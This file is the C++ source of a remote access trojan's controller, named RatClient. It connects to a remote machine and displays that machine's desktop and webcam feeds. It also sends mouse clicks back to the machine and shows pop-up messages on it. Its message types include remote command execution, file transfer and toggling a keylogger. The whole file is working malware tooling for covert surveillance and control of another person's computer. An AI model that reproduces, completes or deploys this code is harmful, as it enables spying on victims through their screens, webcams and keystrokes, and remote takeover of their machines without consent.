// RatClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/NetworkHandlerClient.h"

#include <string>
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

NetworkHandlerClient NH;
string DesktopFeed = "Desktop Feed";
string CamFeed = "Cam Feed";

void CallBackFunc(int event, int x, int y, int flags, void* userdata)
{
    if (event == cv::EVENT_LBUTTONDOWN)
    {
        cout << "Left button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
        NH.SendDataT<int>(x);
        NH.SendDataT<int>(y);
    }
    else if (event == cv::EVENT_RBUTTONDOWN)
    {
        cout << "Right button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MBUTTONDOWN)
    {
        cout << "Middle button of the mouse is clicked - position (" << x << ", " << y << ")" << endl;
    }
    else if (event == cv::EVENT_MOUSEMOVE)
    {
        //cout << "Mouse move over the window - position (" << x << ", " << y << ")" << endl;

    }
}

void rcv() {
    DataType dt;
    cv::Mat image;
    INPUT in;

    NH.AddDataType("DesktopIMG", 2);
    NH.AddDataType("MousePos", 3);
    NH.AddDataType("MouseDown", 4);
    NH.AddDataType("MouseUp", 5);
    NH.AddDataType("KeyDown", 6);
    NH.AddDataType("KeyUp", 7);
    NH.AddDataType("CamIMG", 8);
    NH.AddDataType("SendFILE", 9);
    NH.AddDataType("RecvFILE", 10);
    NH.AddDataType("CMD", 11);
    NH.AddDataType("EnableLogger", 12);
    NH.AddDataType("DisableLogger", 13);
    NH.AddDataType("RecvPopUp", 14);
    NH.AddDataType("RecvPopUpYN", 15);
    NH.AddDataType("ConsoleMessage", 16);
    //NH.AddDataType("", 3);

    while (true) {
        NH.RecvDataType(&dt);
        if (dt.Name == "SendFILE") {
            std::string path;
            NH.RecvDataT<std::string>(&path);
            NH.RecvFile(path);
        }
        else if (dt.Name == "DesktopIMG")
        {

            cv::resizeWindow(DesktopFeed, image.cols / 2, image.rows / 2);

            cv::setMouseCallback(DesktopFeed, CallBackFunc, NULL);
            NH.RecvCVMat(&image);


            cv::imshow(DesktopFeed, image); // Show our image inside the created window.

            if (cv::waitKey(10) == 27)
            {
                cout << "Esc key is pressed by user. Stoppig the video" << endl;
                cv::destroyWindow(DesktopFeed);
            }
        }
        else if (dt.Name == "CamIMG") {
            NH.RecvCVMat(&image);


            cv::imshow(CamFeed, image); // Show our image inside the created window.

            if (cv::waitKey(10) == 27)
            {
                cout << "Esc key is pressed by user. Stoppig the video" << endl;
                cv::destroyWindow(CamFeed);
            }
        }
        else {
            //printf("invalid packet type");
        }

    }
}

int main()
{
    thread recvThread;

    string input = "";
    string ip="None";
    string port= "None";
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    recvThread = thread(rcv);

    while (true)
    {
        SetConsoleTextAttribute(hConsole, 12);
        cout << "IP: ";
        SetConsoleTextAttribute(hConsole, 7);
        cout << ip;
        SetConsoleTextAttribute(hConsole, 12);
        cout << " Port: ";
        SetConsoleTextAttribute(hConsole, 7);
        cout << port << endl;
        SetConsoleTextAttribute(hConsole, 10);
        cout << "enter command: ";
        SetConsoleTextAttribute(hConsole, 7);
        getline(cin, input);
        if (input == "Connect") {  
            SetConsoleTextAttribute(hConsole, 12);
            cout << "Enter IP Adress: ";
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, ip);
            SetConsoleTextAttribute(hConsole, 12);
            cout << "Enter Port: ";
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, port);
            NH.DisConnect();
            system("cls");
            if (NH.Init((PCSTR)ip.c_str(), (PCSTR)port.c_str())) {
                if (!NH.Connect()) {
                    ip = "None";
                    port = "None"; 
                    SetConsoleTextAttribute(hConsole, 13);
                    printf("failed to connect!\n");
                    NH.DisConnect();
                }
                else
                {
                    NH.SendDataType(1);
                    NH.SendTypeList();
                }
            }
            else {
                ip = "None";
                port = "None";
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect();
            }
        }
        if (input == "DefaultConnect") {
            NH.DisConnect();
            system("cls");
            if (NH.DefaultInitConnect()) {
                ip = NH.getIP();
                port = NH.getPort();
                NH.SendDataType(1);
                NH.SendTypeList();
            }
            else {
                ip = "None";
                port = "None";
                SetConsoleTextAttribute(hConsole, 13);
                printf("failed to connect!\n");
                NH.DisConnect();
            }
            continue;
        }
        else if (input == "Disconnect") {
            ip = "None";
            port = "None";
            NH.DisConnect();
        }
        else if (input == "Help") {
            SetConsoleTextAttribute(hConsole, 11);
            printf("Commands are: \n");
            printf("Connect \n");
            printf("DefaultConnect \n");
            printf("Disconnect \n");
            printf("Message \n");
            printf("MessageBox \n");
            printf("MessageBoxYN \n");
            continue;
        }
        else if (input == "Message") {
            SetConsoleTextAttribute(hConsole, 10);
            printf("Enter message: ");
            SetConsoleTextAttribute(hConsole, 7);
            getline(cin, input);
            NH.SendDataType("ConsoleMessage");
            NH.SendDataT<string>(input);
        }
        else if (input == "MessageBox") {
            NH.SendDataType("RecvPopUp");

            string title;
            string msg;
            printf("Box Title: ");
            getline(cin, title);
            printf("Box Message: ");
            getline(cin, msg);

            NH.SendDataT<wstring>(s2ws(title+'\0'));
            NH.SendDataT<wstring>(s2ws(msg + '\0'));
            continue;
        }
        else if (input == "MessageBoxYN") {
            NH.SendDataType("RecvPopUpYN");

            string title;
            string msg;
            printf("Box Title: ");
            getline(cin, title);
            printf("Box Message: ");
            getline(cin, msg);

            NH.SendDataT<wstring>(s2ws(title));
            NH.SendDataT<wstring>(s2ws(msg));

            int awnser;

            NH.RecvDataT<int>(&awnser);

            if (awnser == 1) {
                printf("Answer is yes\n");
            }
            else {
                printf("Answer is no\n");
            }
        }
        else if (input == "") {
            
        }
        else if (input == "") {

        }
        else {
            cout << "Invalid Command!" << endl;
            continue;
        }
        system("cls");
    }
    system("pause");
    return 0;
}